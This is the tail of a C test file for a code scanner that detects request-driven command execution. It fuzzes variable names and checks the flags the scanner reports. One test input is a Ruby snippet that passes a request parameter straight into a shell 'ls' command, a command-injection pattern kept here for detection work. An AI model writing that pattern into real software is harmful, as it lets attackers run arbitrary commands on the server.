		{ RB, "@1 = params[:c]\nsystem \"ls #{@1}\"\n", F_REQ_EXEC | F_ANY_EXEC },
	};
	size_t t;
	unsigned it;

	for (it = 0; it < 60u; it++) {
		for (t = 0; t < sizeof T / sizeof T[0]; t++) {
			char n1[16], n2[16], src[512], *o = src;
			const char *p;
			struct kgenome_diag_scan *s;

			rname(n1);
			rname(n2);
			for (p = T[t].fmt; *p && o < src + sizeof src - 20; p++) {
				if (*p == '@' && (p[1] == '1' || p[1] == '2')) {
					o += sprintf(o, "%s", p[1] == '1' ? n1 : n2);
					p++;
				} else {
					*o++ = *p;
				}
			}
			*o = 0;
			s = scan_l(T[t].lang, src);
			CK(s && facts(s) == T[t].want, "random names %s %s: facts %#x, wanted %#x in: %s", n1, n2, s ? facts(s) : 0u, T[t].want, src);
			if (s)
				kgenome_diag_scan_free(s);
		}
	}
}

int main(void)
{
	rows_run();
	names();
	folds();
	refused();
	hidden();
	random_names();
	printf("diag text stmt: %s\n", fails ? "FAILED" : "ok");
	return fails != 0;
}
